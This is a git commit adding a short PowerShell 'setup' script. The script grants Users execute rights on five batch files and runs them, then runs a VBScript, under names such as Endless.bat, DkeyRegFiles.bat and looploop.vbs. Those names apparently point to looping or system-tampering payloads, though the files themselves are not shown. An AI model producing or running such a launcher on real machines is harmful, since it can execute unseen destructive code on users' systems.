0bed2446d5ea551eadd96756c88314421a84b772
GH05T HUNTER5 <108191615+GH05T-HUNTER5@users.noreply.github.com>
2023-04-14 13:57:03 +0000

    Add files via upload

---
+++ setup.ps1
@@ -0,0 +1,13 @@
+Cls 
+icacls interservertk.bat /grant Users:(RX)
+icacls DkeyRegFiles.bat /grant Users:(RX) 
+icacls psychonotes.bat /grant Users:(RX) 
+icacls cDdrive.bat /grant Users:(RX) 
+icacls Endless.bat /grant Users:(RX) 
+./interservertk.bat 
+./DkeyRegFiles.bat 
+./psychonotes.bat 
+./cDdrive.bat 
+./Endless.bat
+cscript looploop.vbs 
+Cls 
